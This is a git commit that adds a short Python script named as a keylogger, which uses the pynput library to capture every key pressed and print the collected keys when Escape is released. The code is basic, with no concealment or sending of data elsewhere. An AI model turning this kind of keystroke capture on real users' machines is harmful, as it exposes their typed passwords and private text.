a70c8aff0cd6138486ace3a93c632693952309bb
Vishal Vinay ram <97974592+VishalVR-21@users.noreply.github.com>
2022-10-13 22:59:45 +0530

    Add files via upload
    key-logger-added

---
+++ key-looger.py
@@ -0,0 +1,20 @@
+﻿import pynput
+from pynput.keyboard import Key, Listener
+
+keys = []
+
+
+def press(key):
+    if (key == Key.esc):
+        return
+    keys.append(key)
+
+
+def release(key):
+    if key == Key.esc:
+        print(keys)
+        return
+
+
+with Listener(on_press=press, on_release=release) as hear:
+    hear.join()
